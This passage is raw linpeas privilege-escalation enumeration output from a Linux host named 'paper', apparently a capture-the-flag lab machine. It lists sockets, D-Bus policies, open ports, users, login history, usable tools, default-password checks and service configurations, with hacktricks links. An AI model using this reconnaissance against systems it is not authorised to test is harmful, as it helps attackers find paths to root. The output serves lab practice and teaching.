  └─(Read Write)
/run/user/1004/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1004/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1004/pipewire-0
  └─(Read Write)
/run/user/1004/pulse/native
  └─(Read Write)
/run/user/1004/systemd/notify
  └─(Read Write)
/run/user/1004/systemd/private
  └─(Read Write)
/run/vmware/guestServicePipe
  └─(Read Write)
/tmp/.esd-1004/socket
  └─(Read Write)
/tmp/mongodb-27017.sock
/var/cache/PackageKit/8/metadata/BaseOS-8-x86_64/gpgdir/S.gpg-agent
/var/cache/PackageKit/8/metadata/BaseOS-8-x86_64/gpgdir/S.gpg-agent.browser
/var/cache/PackageKit/8/metadata/BaseOS-8-x86_64/gpgdir/S.gpg-agent.extra
/var/cache/PackageKit/8/metadata/BaseOS-8-x86_64/gpgdir/S.gpg-agent.ssh
/var/cache/PackageKit/8/metadata/extras-8-x86_64/gpgdir/S.gpg-agent
/var/cache/PackageKit/8/metadata/extras-8-x86_64/gpgdir/S.gpg-agent.browser
/var/cache/PackageKit/8/metadata/extras-8-x86_64/gpgdir/S.gpg-agent.extra
/var/cache/PackageKit/8/metadata/extras-8-x86_64/gpgdir/S.gpg-agent.ssh
/var/lib/gssproxy/default.sock
  └─(Read Write)
/var/lib/mysql/mysql.sock
  └─(Read Write)
/var/lib/mysql/mysqlx.sock
  └─(Read Write)
/var/lib/sss/pipes/nss
  └─(Read Write)
/var/lib/sss/pipes/private/sbus-dp_implicit_files.1095
/var/lib/sss/pipes/private/sbus-monitor
/var/run/.heim_org.h5l.kcm-socket
  └─(Read Write)
/var/run/lsm/ipc/sim
  └─(Read Write)
/var/run/lsm/ipc/simc
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                        
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)                                                          
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="avahi">)
Possible weak user policy found on /etc/dbus-1/system.d/gdm.conf (  <policy user="gdm">)
Possible weak user policy found on /etc/dbus-1/system.d/net.hadess.SensorProxy.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.fedoraproject.Setroubleshootd.conf (        <policy user="setroubleshoot">)
Possible weak user policy found on /etc/dbus-1/system.d/org.fedoraproject.SetroubleshootPrivileged.conf (  <policy user="setroubleshoot">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.PolicyKit1.conf (  <policy user="polkitd">
  <policy user="polkitd">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf (  <policy user="rtkit">)
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                        
NAME                                              PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION      
:1.0                                                1 systemd         root             :1.0          init.scope                -          -
:1.1                                             1027 systemd-machine root             :1.1          systemd-machined.service  -          -
:1.10                                            1028 polkitd         polkitd          :1.10         polkit.service            -          -
:1.12                                            1086 NetworkManager  root             :1.12         NetworkManager.service    -          -
:1.25                                            1216 accounts-daemon[0m root             :1.25         accounts-daemon.service   -          -
:1.27                                            1086 NetworkManager  root             :1.27         NetworkManager.service    -          -
:1.28                                            1215 systemd-logind  root             :1.28         systemd-logind.service    -          -
:1.41                                            1687 systemd         dwight           :1.41         user@1004.service         -          -
:1.48                                            1127 tuned           root             :1.48         tuned.service             -          -
:1.565                                          23290 packagekitd     root             :1.565        packagekit.service        -          -
:1.6                                             1031 rtkit-daemon    root             :1.6          rtkit-daemon.service      -          -
:1.675                                          53191 busctl          dwight           :1.675        session-1.scope           1          -
:1.7                                             1047 ModemManager    root             :1.7          ModemManager.service      -          -
:1.78                                            1795 pulseaudio      dwight           :1.78         user@1004.service         -          -
:1.8                                             1025 udisksd         root             :1.8          udisks2.service           -          -
:1.9                                             1032 avahi-daemon    avahi            :1.9          avahi-daemon.service      -          -
com.redhat.Blivet0                                  - -               -                (activatable) -                         -
com.redhat.ifcfgrh1                              1086 NetworkManager  root             :1.27         NetworkManager.service    -          -
com.redhat.tuned                                 1127 tuned           root             :1.48         tuned.service             -          -
fi.w1.wpa_supplicant1                               - -               -                (activatable) -                         -
net.reactivated.Fprint                              - -               -                (activatable) -                         -
org.bluez                                           - -               -                (activatable) -                         -
org.fedoraproject.SetroubleshootFixit               - -               -                (activatable) -                         -
org.fedoraproject.SetroubleshootPrivileged          - -               -                (activatable) -                         -
org.fedoraproject.Setroubleshootd                   - -               -                (activatable) -                         -
org.freedesktop.Accounts                         1216 accounts-daemon[0m root             :1.25         accounts-daemon.service   -          -
org.freedesktop.Avahi                            1032 avahi-daemon    avahi            :1.9          avahi-daemon.service      -          -
org.freedesktop.ColorManager                        - -               -                (activatable) -                         -
org.freedesktop.DBus                                1 systemd         root             -             init.scope                -          -
org.freedesktop.Flatpak.SystemHelper                - -               -                (activatable) -                         -
org.freedesktop.GeoClue2                            - -               -                (activatable) -                         -
org.freedesktop.ModemManager1                    1047 ModemManager    root             :1.7          ModemManager.service      -          -
org.freedesktop.NetworkManager                   1086 NetworkManager  root             :1.12         NetworkManager.service    -          -
org.freedesktop.PackageKit                      23290 packagekitd     root             :1.565        packagekit.service        -          -
org.freedesktop.PolicyKit1                       1028 polkitd         polkitd          :1.10         polkit.service            -          -
org.freedesktop.RealtimeKit1                     1031 rtkit-daemon    root             :1.6          rtkit-daemon.service      -          -
org.freedesktop.UDisks2                          1025 udisksd         root             :1.8          udisks2.service           -          -
org.freedesktop.UPower                              - -               -                (activatable) -                         -
org.freedesktop.bolt                                - -               -                (activatable) -                         -
org.freedesktop.fwupd                               - -               -                (activatable) -                         -
org.freedesktop.hostname1                           - -               -                (activatable) -                         -
org.freedesktop.import1                             - -               -                (activatable) -                         -
org.freedesktop.locale1                             - -               -                (activatable) -                         -
org.freedesktop.login1                           1215 systemd-logind  root             :1.28         systemd-logind.service    -          -
org.freedesktop.machine1                         1027 systemd-machine root             :1.1          systemd-machined.service  -          -
org.freedesktop.nm_dispatcher                       - -               -                (activatable) -                         -
org.freedesktop.portable1                           - -               -                (activatable) -                         -
org.freedesktop.realmd                              - -               -                (activatable) -                         -
org.freedesktop.resolve1                            - -               -                (activatable) -                         -
org.freedesktop.systemd1                            1 systemd         root             :1.0          init.scope                -          -
org.freedesktop.timedate1                           - -               -                (activatable) -                         -
org.gnome.GConf.Defaults                            - -               -                (activatable) -                         -
org.opensuse.CupsPkHelper.Mechanism                 - -               -                (activatable) -                         -


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                                    
                                        ╚═════════════════════╝                                                                                            
╔══════════╣ Hostname, hosts and DNS
paper                                                                                                                                                      
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
127.0.0.1 paper office.paper chat.office.paper
nameserver 192.168.122.1
nameserver 1.1.1.1
nameserver 1.0.0.1

╔══════════╣ Interfaces
default 0.0.0.0                                                                                                                                            
loopback 127.0.0.0
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.143  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:a76e  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:a76e  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:a7:6e  txqueuelen 1000  (Ethernet)
        RX packets 105775  bytes 10879475 (10.3 MiB)
        RX errors 0  dropped 142  overruns 0  frame 0
        TX packets 95422  bytes 31356669 (29.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 151665  bytes 34087862 (32.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 151665  bytes 34087862 (32.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

virbr0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
        ether 52:54:00:9b:e7:f7  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                                                                          
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:48320         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      2400/node           
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                         
                                                                                                                                                           


                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                                    
                                         ╚═══════════════════╝                                                                                             
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                        
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)                                                                                                      

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                               
netpgpkeys Not Found
netpgp Not Found                                                                                                                                           
                                                                                                                                                           
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                
                                                                                                                                                           
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.


╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                          
ptrace protection is disabled (0)                                                                                                                          
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                      
                                                                                                                                                           
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                            

╔══════════╣ Users with console
dwight:x:1004:1004::/home/dwight:/bin/bash                                                                                                                 
rocketchat:x:1001:1001::/home/rocketchat:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                     
uid=1001(rocketchat) gid=1001(rocketchat) groups=1001(rocketchat)
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
uid=107(qemu) gid=107(qemu) groups=107(qemu),36(kvm)
uid=113(usbmuxd) gid=113(usbmuxd) groups=113(usbmuxd)
uid=11(operator) gid=0(root) groups=0(root)
uid=12(games) gid=100(users) groups=100(users)
uid=14(ftp) gid=50(ftp) groups=50(ftp)
uid=171(pulse) gid=171(pulse) groups=171(pulse)
uid=172(rtkit) gid=172(rtkit) groups=172(rtkit)
uid=193(systemd-resolve) gid=193(systemd-resolve) groups=193(systemd-resolve)
uid=1(bin) gid=1(bin) groups=1(bin)
uid=27(mysql) gid=27(mysql) groups=27(mysql)
uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)
uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m)
uid=32(rpc) gid=32(rpc) groups=32(rpc)
uid=3(adm) gid=4(adm) groups=4(adm)
uid=42(gdm) gid=42(gdm) groups=42(gdm)
uid=48(apache) gid=48(apache) groups=48(apache)
uid=4(lp) gid=7(lp) groups=7(lp)
uid=59(tss) gid=59(tss) groups=59(tss)
uid=5(sync) gid=0(root) groups=0(root)
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
uid=66(pegasus) gid=65(pegasus) groups=65(pegasus)
uid=6(shutdown) gid=0(root) groups=0(root)
uid=70(avahi) gid=70(avahi) groups=70(avahi)
uid=72(tcpdump) gid=72(tcpdump) groups=72(tcpdump)
uid=74(sshd) gid=74(sshd) groups=74(sshd)
uid=75(radvd) gid=75(radvd) groups=75(radvd)
uid=7(halt) gid=0(root) groups=0(root)
uid=81(dbus) gid=81(dbus) groups=81(dbus)
uid=8(mail) gid=12(mail) groups=12(mail)
uid=976(mongod) gid=974(mongod) groups=974(mongod)
uid=977(nginx) gid=975(nginx) groups=975(nginx)
uid=978(insights) gid=976(insights) groups=976(insights)
uid=979(gnome-initial-setup) gid=977(gnome-initial-setup) groups=977(gnome-initial-setup)
uid=980(pipewire) gid=978(pipewire) groups=978(pipewire)
uid=981(setroubleshoot) gid=979(setroubleshoot) groups=979(setroubleshoot)
uid=982(colord) gid=980(colord) groups=980(colord)
uid=983(sssd) gid=981(sssd) groups=981(sssd)
uid=984(clevis) gid=983(clevis) groups=983(clevis),59(tss)
uid=985(dnsmasq) gid=985(dnsmasq) groups=985(dnsmasq)
uid=991(saslauth) gid=76(saslauth) groups=76(saslauth)
uid=992(libstoragemgmt) gid=986(libstoragemgmt) groups=986(libstoragemgmt)
uid=993(chrony) gid=987(chrony) groups=987(chrony)
uid=994(gluster) gid=989(gluster) groups=989(gluster)
uid=995(unbound) gid=990(unbound) groups=990(unbound)
uid=996(cockpit-ws) gid=993(cockpit-ws) groups=993(cockpit-ws)
uid=997(geoclue) gid=994(geoclue) groups=994(geoclue)
uid=998(polkitd) gid=996(polkitd) groups=996(polkitd)
uid=999(systemd-coredump) gid=997(systemd-coredump) groups=997(systemd-coredump)

╔══════════╣ Login now
 10:03:59 up  2:55,  0 users,  load average: 1.02, 0.66, 0.39                                                                                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
root     pts/1        Sat Jul  3 05:02:12 2021 - Sat Jul  3 05:04:14 2021  (00:02)     192.168.1.6                                                         
root     pts/1        Sat Jul  3 05:01:22 2021 - Sat Jul  3 05:02:10 2021  (00:00)     192.168.1.6
root     pts/1        Sat Jul  3 05:01:10 2021 - Sat Jul  3 05:01:21 2021  (00:00)     192.168.1.6
root     pts/1        Sat Jul  3 04:59:39 2021 - Sat Jul  3 05:01:09 2021  (00:01)     192.168.1.6
root     pts/1        Sat Jul  3 04:59:12 2021 - Sat Jul  3 04:59:37 2021  (00:00)     192.168.1.6
root     pts/1        Sat Jul  3 04:49:57 2021 - Sat Jul  3 04:59:04 2021  (00:09)     192.168.1.6
nick     tty2         Sat Jul  3 10:14:32 2021 - down                      (-5:05)     0.0.0.0
reboot   system boot  Sat Jul  3 10:13:30 2021 - Sat Jul  3 05:08:39 2021  (-5:04)     0.0.0.0

wtmp begins Sat Jul  3 10:13:30 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                          
root             tty1                      Tue Feb  1 11:23:55 -0500 2022
gdm              tty1                      Sat Jul  3 07:43:35 -0400 2021
dwight           pts/0    10.10.14.23      Tue Feb  1 09:14:33 -0500 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                           
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                           


                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                                     
                                       ╚══════════════════════╝                                                                                            
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                            
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/usr/bin/nc
/usr/bin/ncat
/usr/bin/perl
/usr/bin/ping
/usr/bin/podman
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/runc
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
gcc.x86_64                         8.5.0-4.el8_5                      @AppStream                                                                           
gcc-c++.x86_64                     8.5.0-4.el8_5                      @AppStream
/usr/bin/gcc
/usr/bin/g++

╔══════════╣ MySQL version
mysql  Ver 8.0.26 for Linux on x86_64 (Source distribution)                                                                                                

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                 
═╣ MySQL connection using root/NOPASS ................. No                                                                                                 
                                                                                                                                                           
╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                           
╔══════════╣ Analyzing Mongo Files (limit 70)
Version: MongoDB shell version v4.0.27                                                                                                                     
git version: d47b151b55f286546e7c7c98888ae0577856ca20
OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013
allocator: tcmalloc
modules: none
build environment:
    distmod: rhel70
    distarch: x86_64
    target_arch: x86_64
db version v4.0.27
git version: d47b151b55f286546e7c7c98888ae0577856ca20
OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013
allocator: tcmalloc
modules: none
build environment:
    distmod: rhel70
    distarch: x86_64
    target_arch: x86_64
Possible mongo anonymous authentication
-rw-r--r--. 1 root root 896 Feb  1 09:25 /etc/mongod.conf
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
storage:
  dbPath: /var/lib/mongo
  journal:
    enabled: true
  engine: wiredTiger
processManagement:
  timeZoneInfo: /usr/share/zoneinfo
net:
  port: 27017
security:
  authorization: "enabled"
replication:
  replSetName: rs01

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found                                                                                                                          
Server version: Apache/2.4.37 (centos)                                                                                                                     
Server built:   Nov 12 2021 04:57:27
Nginx version: nginx Not Found
                                                                                                                                                           
══╣ PHP exec extensions
                                                                                                                                                           
-rw-r--r--. 1 root root 1434 Jul  3  2021 /etc/httpd/conf.d/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog /var/log/error.log
        CustomLog /var/log/access.log combined
        LoadModule headers_module /usr/lib/apache2/modules/mod_headers.so
        Header always set X-Backend-Server "office.paper"

</VirtualHost>

-rw-r--r--. 1 root root 62221 May  6  2020 /etc/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On

╔══════════╣ Analyzing Http conf Files (limit 70)
-rw-r--r--. 1 root root 11927 Jul  3  2021 /etc/httpd/conf/httpd.conf                                                                                      
-rw-r--r-- 1 root root 77 Nov 11 23:54 /usr/lib/tmpfiles.d/httpd.conf

╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x. 2 root root 6 Nov  9 12:23 /etc/NetworkManager/system-connections                                                                              
drwxr-xr-x. 2 root root 6 Nov  9 12:23 /etc/NetworkManager/system-connections


╔══════════╣ Analyzing VNC Files (limit 70)
                                                                                                                                                           



-rw-r--r-- 1 root root 475 Aug  9  2021 /usr/lib/firewalld/services/vnc-server.xml
<?xml version="1.0" encoding="utf-8"?>
<service>
  <short>Virtual Network Computing Server (VNC)</short>
  <description>A VNC server provides an external accessible X session. Enable this option if you plan to provide a VNC server with direct access. The access will be possible for displays :0 to :3. If you plan to provide access with SSH, do not open this option and use the via option of the VNC viewer.</description>                                                                                                                                                     
  <port protocol="tcp" port="5900-5903"/>
</service>

╔══════════╣ Searching ssl/ssh files
══╣ Some certificates were found (out limited):                                                                                                            
/etc/pki/ca-trust/extracted/pem/objsign-ca-bundle.pem                                                                                                      
/etc/pki/ca-trust/source/ca-bundle.legacy.crt
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pki/tls/certs/localhost.crt
/opt/Rocket.Chat/programs/server/node_modules/node-gyp/test/fixtures/ca-bundle.crt
/opt/Rocket.Chat/programs/server/node_modules/node-gyp/test/fixtures/ca.crt
/opt/Rocket.Chat/programs/server/node_modules/node-gyp/test/fixtures/server.crt
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certIssuerKey.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certKey.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certKeyProduction.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/cert.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certProduction.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/keyEncrypted.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/keyIssuer.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/key.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/keyPKCS8Encrypted.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/keyPKCS8.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/keyProduction.pem
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/multipleKeys.pem
46374PSTORAGE_CERTSBIN

══╣ Some client certificates were found:
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certIssuerKeyOpenSSL.p12                                                    
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certIssuerKey.p12
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/certIssuerKeyPassphrase.p12
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/credentials/support/multipleKeys.p12
/opt/Rocket.Chat/programs/server/npm/node_modules/apn/test/support/initializeTest.pfx
/opt/Rocket.Chat/programs/server/npm/node_modules/xml-encryption/test/test-auth0.pfx
/opt/Rocket.Chat/programs/server/npm/node_modules/xml-encryption/test/test-cbc128.pfx


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x. 2 root root 4096 Jan 14 05:01 /etc/pam.d                                                                                                       
-rw-r--r--. 1 root root 727 Jul 13  2021 /etc/pam.d/sshd
auth       substack     password-auth
auth       include      postlogin
account    include      password-auth
password   include      password-auth
session    include      password-auth


╔══════════╣ Analyzing NFS Exports Files (limit 70)
-rw-r--r--. 1 root root 0 Sep 10  2018 /etc/exports                                                                                                        

╔══════════╣ Searching kerberos conf files and tickets
╚ http://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-active-directory                                                                        
ptrace protection is disabled (0), you might find tickets inside processes memory                                                                          
-rw-r--r--. 1 root root 812 Aug 26  2021 /etc/krb5.conf
# To opt out of the system crypto-policies configuration of krb5, remove the
# symlink at /etc/krb5.conf.d/crypto-policies which will not be recreated.
includedir /etc/krb5.conf.d/

[logging]
    default = FILE:/var/log/krb5libs.log
    kdc = FILE:/var/log/krb5kdc.log
    admin_server = FILE:/var/log/kadmind.log

[libdefaults]
    dns_lookup_realm = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false
    pkinit_anchors = FILE:/etc/pki/tls/certs/ca-bundle.crt
    spake_preauth_groups = edwards25519
#    default_realm = EXAMPLE.COM
    default_ccache_name = KEYRING:persistent:%{uid}

[realms]
# EXAMPLE.COM = {
#     kdc = kerberos.example.com
#     admin_server = kerberos.example.com
# }

[domain_realm]
# .example.com = EXAMPLE.COM
# example.com = EXAMPLE.COM
-rw-r--r--. 1 root root 189 Dec 21 15:14 /usr/lib64/sssd/conf/sssd.conf
[sssd]
services = nss, pam
domains = shadowutils

[nss]

[pam]

[domain/shadowutils]
id_provider = files

auth_provider = proxy
proxy_pam_target = sssd-shadowutils

proxy_fast_alias = True
tickets kerberos Not Found
klist Not Found                                                                                                                                            
                                                                                                                                                           


╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                          
tmux 2.7                                                                                                                                                   


/tmp/tmux-1004
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                             
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /var/lib/sss/mc/passwd

╔══════════╣ Analyzing Github Files (limit 70)
drwx--x--x 2 dwight dwight 23 Jul  3  2021 /home/dwight/hubot/node_modules_bak/hubot/.github                                                               
drwx--x--x 2 dwight dwight 23 Jul  3  2021 /home/dwight/hubot/node_modules_bak/node_modules.bak/hubot/.github
drwxrwxr-x 2 dwight dwight 23 Jul  3  2021 /home/dwight/hubot/node_modules/hubot/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  3  2021 /opt/Rocket.Chat/programs/server/node_modules/aws4/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  3  2021 /opt/Rocket.Chat/programs/server/node_modules/balanced-match/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  3  2021 /opt/Rocket.Chat/programs/server/node_modules/fast-json-stable-stringify/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  3  2021 /opt/Rocket.Chat/programs/server/node_modules/needle/.github
drwxr-xr-x 2 rocketchat rocketchat 63 Jul  3  2021 /opt/Rocket.Chat/programs/server/node_modules/node-gyp/.github
drwxr-xr-x 2 rocketchat rocketchat 26 Jul  3  2021 /opt/Rocket.Chat/programs/server/node_modules/npm-normalize-package-bin/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array-includes/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array-includes/node_modules/es-abstract/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array-includes/node_modules/es-to-primitive/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array-includes/node_modules/has-symbols/.github
drwxr-xr-x 3 rocketchat rocketchat 63 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array-includes/node_modules/is-callable/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array-includes/node_modules/is-regex/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array.prototype.flat/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array.prototype.flat/node_modules/es-abstract/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array.prototype.flat/node_modules/es-to-primitive/.github                                                                                                                                                        
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array.prototype.flat/node_modules/has-symbols/.github
drwxr-xr-x 3 rocketchat rocketchat 63 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array.prototype.flat/node_modules/is-callable/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/array.prototype.flat/node_modules/is-regex/.github
drwxr-xr-x 2 rocketchat rocketchat 38 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/bugsnag/.github
drwxr-xr-x 2 rocketchat rocketchat 48 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/clipboard/.github
drwxr-xr-x 3 rocketchat rocketchat 28 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/csv-parse/lib/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/flatted/.github
drwxr-xr-x 3 rocketchat rocketchat 28 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/focus-within-polyfill/.github
drwxr-xr-x 2 rocketchat rocketchat 117 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/googleapis/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/is-string/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/is-what/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/libmime/.github
drwxr-xr-x 2 rocketchat rocketchat 28 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/libmime/node_modules/iconv-lite/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/mailparser/.github
drwxr-xr-x 2 rocketchat rocketchat 28 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/mailparser/node_modules/iconv-lite/.github
